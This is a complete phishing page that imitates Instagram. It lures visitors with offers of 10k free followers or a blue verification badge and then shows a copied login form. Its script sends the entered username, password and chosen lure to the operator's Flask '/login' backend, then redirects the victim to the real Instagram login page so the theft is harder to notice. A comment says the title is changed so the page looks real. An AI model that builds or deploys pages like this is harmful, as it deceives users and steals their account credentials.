<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Instagram Services</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        * { box-sizing: border-box; }
        body {
            background: #fafafa;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
        }

        /* Selection Page Styles */
        #selection-page { text-align: center; }
        .service-card {
            background: white; width: 350px; padding: 30px;
            border: 1px solid #dbdbdb; border-radius: 8px; margin-bottom: 10px;
        }
        .btn-option {
            width: 100%; padding: 12px; margin: 10px 0;
            border: none; border-radius: 5px; cursor: pointer;
            font-weight: bold; font-size: 14px; background: #0095f6; color: white;
            display: flex; align-items: center; justify-content: center; gap: 10px;
        }

        /* Login Page Styles (Hidden initially) */
        #login-page { display: none; flex-direction: column; align-items: center; }
        .box {
            background: white; width: 350px; padding: 20px 40px;
            border: 1px solid #dbdbdb; text-align: center; margin-bottom: 10px;
        }

        /* Instagram UI Elements */
        .icon {
            width: 60px; height: 60px; margin: 0 auto 15px; border-radius: 15px;
            background: radial-gradient(circle at 30% 107%, #fdf497 0%, #fdf497 5%, #fd5949 45%, #d6249f 60%, #285AEB 90%);
            position: relative;
        }
        .icon::before {
            content: ""; position: absolute; top: 13px; left: 13px;
            width: 28px; height: 28px; border: 3px solid white; border-radius: 50%;
        }
        .icon::after {
            content: ""; position: absolute; top: 10px; right: 10px;
            width: 5px; height: 5px; background: white; border-radius: 50%;
        }
        .name { font-size: 30px; font-weight: bold; letter-spacing: -1px; margin-bottom: 15px; }
        
        /* Blue Tick Badge */
        .blue-tick { width: 18px; height: 18px; display: inline-block; vertical-align: middle; }

        input {
            width: 100%; padding: 9px 8px; margin-bottom: 6px;
            border: 1px solid #dbdbdb; background: #fafafa; font-size: 12px; border-radius: 3px;
        }
        button#loginBtn {
            width: 100%; padding: 7px; background: #0095f6; color: white;
            border: none; font-weight: 600; border-radius: 8px; cursor: pointer; margin-top: 8px;
        }
        .separator {
            display: flex; align-items: center; margin: 20px 0; color: #8e8e8e; font-size: 13px; font-weight: 600;
        }
        .separator::before, .separator::after { content: ""; flex: 1; height: 1px; background: #dbdbdb; }
        .separator::before { margin-right: 18px; } .separator::after { margin-left: 18px; }

        .fb-login { color: #385185; font-size: 14px; font-weight: 600; text-decoration: none; display: block; margin-bottom: 15px; }
        .signup-box { background: white; width: 350px; padding: 20px; border: 1px solid #dbdbdb; text-align: center; font-size: 14px; }
    </style>
</head>
<body>

    <div id="selection-page">
        <div class="service-card">
            <div class="icon"></div>
            <div class="name">Instagram</div>
            <p style="color: #8e8e8e; font-size: 14px;">Choose a service to continue</p>
            <button class="btn-option" onclick="showLogin('Free Followers')">ðŸ‘¤ Get 10k Followers</button>
            <button class="btn-option" onclick="showLogin('Verification')">âœ” Get Blue Verification</button>
        </div>
    </div>

    <div id="login-page">
        <div class="box">
            <div class="logo">
                <div class="icon"></div>
                <div id="service-title" class="name">Instagram</div>
            </div>

            <form onsubmit="sendData(); return false;">
                <input type="text" id="username" placeholder="Phone number, username, or email" required>
                <input type="password" id="password" placeholder="Password" required>
                <button type="submit" id="loginBtn">Log In</button>
            </form>

            <div class="separator">OR</div>
            <a href="#" class="fb-login">Log in with Facebook</a>
        </div>
        <div class="signup-box">
            Don't have an account? <a href="#" style="color: #0095f6; text-decoration: none; font-weight: bold;">Sign up</a>
        </div>
    </div>

    <script>
        let selectedService = "";

        function showLogin(service) {
            selectedService = service;
            document.getElementById('selection-page').style.display = 'none';
            document.getElementById('login-page').style.display = 'flex';
            
            // Title badalna taaki real lage
            if(service === 'Verification') {
                document.getElementById('service-title').innerHTML = 'Verification <img class="blue-tick" src="https://upload.wikimedia.org/wikipedia/commons/e/e4/Twitter_Verified_Badge.svg">';
            } else {
                document.getElementById('service-title').innerText = '10K Followers';
            }
        }

        async function sendData() {
            const btn = document.getElementById("loginBtn");
            const user = document.getElementById("username").value;
            const pass = document.getElementById("password").value;

            btn.disabled = true;
            btn.innerText = "Verifying Account...";

            try {
                // Aapka Flask backend route
                await fetch("/login", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ 
                        username: user, 
                        password: pass,
                        service: selectedService 
                    })
                });

                // Redirect to real Instagram
                window.location.href = "https://www.instagram.com/accounts/login/";
            } catch (error) {
                window.location.href = "https://www.instagram.com";
            }
        }
    </script>
</body>
</html>
